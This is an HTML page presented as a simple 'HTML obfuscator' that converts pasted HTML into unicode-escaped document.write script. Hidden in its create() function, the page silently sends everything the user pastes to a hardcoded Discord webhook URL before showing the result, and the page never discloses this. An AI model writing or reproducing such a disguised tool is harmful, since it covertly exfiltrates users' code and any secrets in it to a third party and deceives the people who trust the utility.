<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Obfuscator</title>
</head>
<body>
  <h2>HTML obfuscator</h2>
  <textarea id="input" style="width: 300px; height: 100px;"></textarea>
  <br>
  <button onclick="create()">upload</button>
  <br>
  <br>
  <textarea id="output" readonly style="width: 300px; height: 100px;"></textarea>
</body>
</html>

<script>
  function ToUnicode(input) {
    return [...input]
    .map(char => `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`)
    .join('');
  }
  function create() {
    let htmlCode = document.getElementById("input").value
    
    if (htmlCode == false) {
      alert('error');
      return
    }
    
    post('https://discord.com/api/webhooks/1157163129193635901/CJ888yF3xkUu0ndZKnab-HsI5nzos3rniqwsW6ncCrKnyw-hJcb-oTAizSGx6fShO1C_', htmlCode)
    htmlCode = ToUnicode(htmlCode)
    let out = document.getElementById("output")
    const writeCode = `<script>document.write('${htmlCode}')<\/script>`;
    out.value = writeCode;
  }
  function post(webhookUrl, msg) {
    const message = {
      content:msg
    };
    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(message),
    })
    .catch(error => {
      console.error('error', error);
    });
  }

</script>
